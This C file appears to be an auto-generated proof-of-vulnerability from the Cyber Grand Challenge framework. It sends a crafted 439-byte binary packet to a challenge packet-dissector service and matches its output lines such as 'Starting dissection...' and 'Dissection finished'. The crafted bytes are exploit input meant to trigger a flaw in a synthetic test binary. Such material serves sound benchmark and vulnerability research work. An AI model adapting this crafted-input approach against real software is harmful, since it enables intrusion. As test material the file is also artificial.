#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\xb7\x01\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x00\x00\x00\x00\x9f\x01\x00\x00\x97\x01\x00\x00"
         "\x00\x00\x00\x00\x10\x01\x10\x10\x00\x00\x00\x00\x97\x01\x00\x00"
         "\x65\xb1\x94\xeb\xf2\xb6\xfe\xdc\xc4\xe9\xc0\x41\xc5\x26\x07\xe7"
         "\x87\xe5\x36\xac\x28\x00\x00\x00\x41\x00\x01\x06\x8a\x4a\x01\xf4"
         "\x01\x00\xf2\x25\xcf\x41\x00\x57\x79\x8b\x60\x07\x5e\x5d\x16\x41"
         "\x00\x8c\x17\x55\x8c\x3f\xf0\x75\xdb\x41\x16\x18\x83\x23\xa2\x72"
         "\x65\x2f\x27\x01\x4f\x60\xf3\xa7\x41\x00\x31\xb3\xf7\xe6\xa0\xb0"
         "\x7d\x2c\xa8\xe4\x9c\x19\x07\x41\x00\xec\x1e\xd7\xeb\x06\x9d\x1b"
         "\xd3\x42\xb7\xe7\x27\xe1\x34\xab\xfa\x7e\x6e\x1c\xd1\x51\xb3\xa4"
         "\x42\x6e\x65\xcb\xab\x8a\x6f\x74\x95\x69\x5d\x01\x00\x32\x01\x00"
         "\x72\x5e\xb6\xa8\x4d\x01\xc0\x41\x00\x01\x00\xe4\x74\x1d\x28\xff"
         "\x4a\x64\xd6\x80\xae\xd3\x9b\xa5\x07\xb6\x15\x30\x41\x91\x0d\xc1"
         "\xac\x4d\x8c\x70\x58\xb4\x62\x22\x99\x60\x08\xcc\xb3\x5d\x24\xf6"
         "\x75\x66\x60\x9e\x91\xa5\x40\xde\xd6\x84\x14\xb7\x9e\x82\x09\xa5"
         "\x67\x9e\x47\xde\x51\xce\x2c\xe5\x30\x44\x6d\x25\xa5\xa8\x43\x5f"
         "\x4c\x3b\xe7\x79\xdc\x7c\xa7\xf4\x92\x47\xdb\xc0\xc3\x89\xba\x98"
         "\x6d\x5e\x0f\xcc\xaf\x08\x1a\xd0\x19\x66\x19\x83\x60\x8b\x4f\xd3"
         "\x7a\x60\xe7\x83\x86\xc2\x99\x7b\x58\x6a\x59\xd6\x93\x28\x08\xff"
         "\xea\xd8\x03\x67\xa7\xe6\x26\xcc\xf3\x97\x8e\x4a\x71\xb1\xc9\x57"
         "\xe0\x56\x6f\x6b\xac\x4f\xc1\x51\xa8\x95\x2a\x8f\x3a\x7a\xed\x47"
         "\x38\xbc\x11\x75\xf0\x77\x23\x59\x1e\xfa\x5e\xc4\x64\x0c\x3e\x89"
         "\xd4\x68\xed\x5f\x47\xf0\x10\x17\x54\x14\x7e\xb8\x98\x20\xce\x4b"
         "\x26\xae\x2d\xd0\xcd\x18\x40\x28\x70\xc0\x45\x4a\xc1\x37\x65\x30"
         "\xc9\x7d\xc2\xef\x13\x87\x20\x48\x6a\x1e\x89\x6c\x12\x59\xf0\x59"
         "\xb8\xb9\x31\xfe\x3c\x93\x9a\x13\x5b\x14\xe5\x1a\xdf\x90\x75\x90"
         "\x2d\x15\x4b\xe8\x9d\x6b\xe3\x5e\xdc\x2b\xd9\xf8\x20\xf1\xf3\xa1"
         "\x71\x98\x8f\x9f\xe9\x35\x87\xef\x3d\xc2\xbf\x94\x71\x49\x3e\x5d"
         "\x6c\x38\xf8\x7f\x36\x97\x3d";
      static unsigned int write_00001_00000_len = 439;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===llama
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===llamadigredience
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61\x64\x69\x67\x72\x65\x64"
         "\x69\x65\x6e\x63\x65";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
